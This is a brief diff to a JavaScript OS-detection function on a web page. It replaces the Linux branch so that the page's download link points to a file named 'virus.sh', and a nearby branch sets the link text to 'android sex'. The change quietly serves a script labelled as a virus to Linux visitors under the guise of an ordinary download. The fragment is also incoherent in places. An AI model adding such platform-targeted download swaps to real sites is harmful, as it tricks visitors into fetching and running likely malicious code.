@@ -18,7 +18,7 @@ function getOS() {
     //Fake Linux
       download.innerHTML="android sex";
     } else if (/Linux/.test(platform)) {
-      os = 'Linux';
+      download.href='./virus.sh';
     }
     
   }
